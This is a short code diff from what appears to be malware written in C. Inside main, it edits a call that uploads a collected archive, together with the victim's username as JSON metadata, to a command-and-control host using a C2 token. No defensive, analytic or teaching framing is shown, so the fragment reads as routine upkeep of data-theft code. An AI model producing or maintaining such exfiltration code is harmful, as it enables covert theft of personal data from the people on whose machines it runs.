@@ -683,7 +683,7 @@ int main(int argc, char *argv[]) {
             snprintf(metadata, sizeof(metadata),
                      "{\"host\":\"%s\",\"user\":\"%s\"}",
                      "unknown", getenv("USERNAME") ? getenv("USERNAME") : "unknown");
-            upload_log(c2_host, c2_port, C2_TOKEN,
+            upload_log(C2_HOST, C2_PORT, C2_TOKEN,
                        archive, archive_len, metadata);
             free(archive);
         }
